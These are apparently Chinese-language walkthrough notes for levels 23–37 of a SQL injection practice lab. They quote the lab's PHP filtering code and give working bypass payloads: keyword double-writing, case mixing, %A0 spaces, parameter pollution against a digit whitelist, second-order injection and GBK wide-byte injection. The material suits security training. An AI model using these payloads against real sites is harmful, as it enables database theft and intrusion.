## 23

2种注释符号被过滤(转义)了,所以加一个分号去闭合后一个分号:

``` ?id=0%27union%20select%201,2,%273 ``` 

## 24

mysql_escape_string 在登录与注册的时候对输入进行转义,但是在修改密码的时候直接使用了session的密码而没有过滤
```
$username= $_SESSION["username"];
```
形成二次注入

ps:这题在我这里有BUG无法登录???

## 25 绕过and or过滤

```
	$id= preg_replace('/or/i',"", $id);			//strip out OR (non case sensitive)
	$id= preg_replace('/AND/i',"", $id);		//Strip out AND (non case sensitive)
```
方法1 使用 aandnd oorr

方法2 使用&& || 

## 26 绕过注释与空格过滤

```
	$id= preg_replace('/or/i',"", $id);			//strip out OR (non case sensitive)
	$id= preg_replace('/and/i',"", $id);		//Strip out AND (non case sensitive)
	$id= preg_replace('/[\/\*]/',"", $id);		//strip out /*
	$id= preg_replace('/[--]/',"", $id);		//Strip out --
	$id= preg_replace('/[#]/',"", $id);			//Strip out #
	$id= preg_replace('/[\s]/',"", $id);		//Strip out spaces
	$id= preg_replace('/[\/\\\\]/',"", $id);		//Strip out slashes
```

所有的特殊字符都被替换了,and与or还可以用以前的方法绕过

使用%A0可能可以绕过空格(这取决与mysql与php的版本?

## 27-28 绕过select union 过滤
```
$id= preg_replace('/[\/\*]/',"", $id);		//strip out /*
$id= preg_replace('/[--]/',"", $id);		//Strip out --.
$id= preg_replace('/[#]/',"", $id);			//Strip out #.
$id= preg_replace('/[ +]/',"", $id);	    //Strip out spaces.
$id= preg_replace('/select/m',"", $id);	    //Strip out spaces.
$id= preg_replace('/[ +]/',"", $id);	    //Strip out spaces.
$id= preg_replace('/union/s',"", $id);	    //Strip out union
$id= preg_replace('/select/s',"", $id);	    //Strip out select
$id= preg_replace('/UNION/s',"", $id);	    //Strip out UNION
$id= preg_replace('/SELECT/s',"", $id);	    //Strip out SELECT
$id= preg_replace('/Union/s',"", $id);	    //Strip out Union
$id= preg_replace('/Select/s',"", $id);	    //Strip out select
```
由于不区分大小写,基本的方法:SeLeCt

也可以这样模拟替换结果:
seleselselectectct

## 29-31 waf白名单

注意,要访问login.php

```
	$match = preg_match("/^\d+$/", $input);

	if($match)
		//echo "you are good";
	else
		//echo "you are bad";
```
使用了数字的白名单

但是,在这之前对输入进行了分割:
```
$qs_array= explode("&",$q_s);


foreach($qs_array as $key => $value)
{
	$val=substr($value,0,2);
	if($val=="id")
	{
		$id_value=substr($value,3,30); 
		return $id_value;
		echo "<br>";
		break;
	}

}
```
就可以:
?id=1&id=' union select 1,2,3 --+

## 32-34 转义quote

```
$string = preg_replace('/'. preg_quote('\\') .'/', "\\\\\\", $string);          //escape any backslash
$string = preg_replace('/\'/i', '\\\'', $string);                               //escape single quote with a backslash
$string = preg_replace('/\"/', "\\\"", $string);                                //escape double quote with a backslash
```

但是给了提示是编码:mysql_query("SET NAMES gbk");

就是说想办法在 ' 之前加上一个编码使他与后面的字符混合在解析的时候解析出 '

?id=-1%df%27union%20select%201,user(),3--+

本质上post也差不多

## 35

 数字型可能不需要处理对quote的转义

 ?id=0%20union%20select%201,2,3%23

## 36-37

mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。

下列字符受影响：
```
\x00
\n
\r
\
'
"
\x1a
```

由于还是GBK本质上和之前的没什么区别